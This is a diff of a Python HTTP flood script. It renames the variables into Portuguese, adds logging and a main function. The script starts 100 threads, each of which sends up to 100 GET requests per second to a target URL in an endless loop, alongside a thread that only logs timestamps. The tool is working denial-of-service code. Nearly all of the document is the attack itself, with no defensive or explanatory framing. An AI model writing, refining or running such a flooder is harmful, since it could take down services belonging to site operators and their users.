@@ -2,41 +2,50 @@ import requests
 import threading
 import time
 import datetime
+import logging
 
-target_url = "http://example.com"
-num_threads = 100
-request_interval = 0.1  # 100 ms
-request_timeout = 5  # 5 segundos
-max_requests_per_second = 100
+# Configurações
+url_alvo = "http://example.com"
+numero_de_threads = 100
+intervalo_de_requisicao = 0.1  # 100 ms
+tempo_limite_de_requisicao = 5  # 5 segundos
+maximo_requisicoes_por_segundo = 100
 
-def http_flood():
+# Configurar o logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+def inundacao_http():
     while True:
-        start_time = time.time()
-        for i in range(max_requests_per_second):
+        tempo_inicio = time.time()
+        for i in range(maximo_requisicoes_por_segundo):
             try:
-                response = requests.get(target_url, timeout=request_timeout)
-                print(f"Request enviada para {target_url} ás {datetime.datetime.now()}")
-            except:
-                print("Erro ao enviar a requisição")
-        elapsed_time = time.time() - start_time
-        if elapsed_time < 1:
-            time.sleep(1 - elapsed_time)
+                resposta = requests.get(url_alvo, timeout=tempo_limite_de_requisicao)
+                logging.info(f"Requisição enviada para {url_alvo} às {datetime.datetime.now()}")
+            except requests.RequestException as e:
+                logging.error(f"Erro ao enviar a requisição: {str(e)}")
+        tempo_decorrido = time.time() - tempo_inicio
+        if tempo_decorrido < 1:
+            time.sleep(1 - tempo_decorrido)
 
-def monitor_traffic():
+def monitorar_trafego():
     while True:
-        print(f"Monitorando o tráfego às {datetime.datetime.now()}")
+        logging.info("Monitorando o tráfego")
         time.sleep(60)  # Monitora a cada 60 segundos
 
-threads = []
-for i in range(num_threads):
-    t = threading.Thread(target=http_flood)
-    threads.append(t)
-    t.start()
+def main():
+    threads = []
+    for i in range(numero_de_threads):
+        t = threading.Thread(target=inundacao_http)
+        threads.append(t)
+        t.start()
 
-monitor_thread = threading.Thread(target=monitor_traffic)
-monitor_thread.start()
+    thread_monitoramento = threading.Thread(target=monitorar_trafego)
+    thread_monitoramento.start()
 
-for t in threads:
-    t.join()
+    for t in threads:
+        t.join()
 
-monitor_thread.join()
+    thread_monitoramento.join()
+
+if __name__ == "__main__":
+    main()
